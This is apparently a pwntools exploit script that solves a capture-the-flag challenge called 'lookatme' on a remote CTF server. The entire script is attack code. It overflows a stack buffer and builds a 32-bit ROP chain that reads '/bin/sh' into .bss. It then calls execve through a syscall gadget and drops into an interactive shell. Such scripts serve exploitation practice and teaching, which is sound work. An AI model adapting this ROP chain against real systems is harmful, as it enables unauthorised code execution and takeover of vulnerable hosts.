from pwn import *

#p = process("./lookatme")
p = remote("ctf.j0n9hyun.xyz", 3017)

print(p.recv().decode())

bss = 0x080eaf80
syscall = 0x806cc25
execve = 0xb
read = 0x806d5f0
popeaxret = 0x80b81c6   # syscall number
popedxecxebxret = 0x806f050    # arg2, rg1, arg0

payload1 = b''
payload1 += b'a'*0x18 + b'b'*0x4
payload1 += p32(read)
payload1 += p32(popedxecxebxret)
payload1 += p32(0x0)
payload1 += p32(bss)
payload1 += p32(0x8)    # /bin/sh\x00
payload1 += p32(popedxecxebxret)
payload1 += p32(0x0)
payload1 += p32(0x0)
payload1 += p32(bss)
payload1 += p32(popeaxret)
payload1 += p32(execve)
payload1 += p32(syscall)

p.sendline(payload1)
time.sleep(0.2)
p.sendline(b'/bin/sh\x00')  # when read executed
time.sleep(0.2)
p.interactive()
